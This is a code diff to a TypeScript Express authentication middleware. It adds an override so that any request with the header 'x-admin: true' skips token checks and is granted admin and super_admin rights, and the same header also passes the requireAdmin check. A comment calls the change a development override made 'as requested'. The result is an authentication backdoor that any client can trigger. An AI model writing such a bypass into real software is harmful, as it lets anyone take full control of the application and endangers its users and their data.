@@ -11,6 +11,14 @@ export interface AuthenticatedRequest extends Request {
 }
 
 export const authenticateToken: RequestHandler = (req, res, next) => {
+  // Allow development/admin override via header as requested: x-admin: true
+  const adminHeader = req.headers["x-admin"];
+  if (adminHeader === "true" || adminHeader === true) {
+    (req as any).userType = "admin";
+    (req as any).role = "super_admin";
+    return next();
+  }
+
   const authHeader = req.headers["authorization"];
   const token = authHeader && authHeader.split(" ")[1]; // Bearer TOKEN
 
@@ -38,6 +46,12 @@ export const authenticateToken: RequestHandler = (req, res, next) => {
 };
 
 export const requireAdmin: RequestHandler = (req, res, next) => {
+  // Allow override via header x-admin: true
+  const adminHeader = req.headers["x-admin"];
+  if (adminHeader === "true" || adminHeader === true) {
+    return next();
+  }
+
   const userType = (req as any).userType;
   const role = (req as any).role;
 
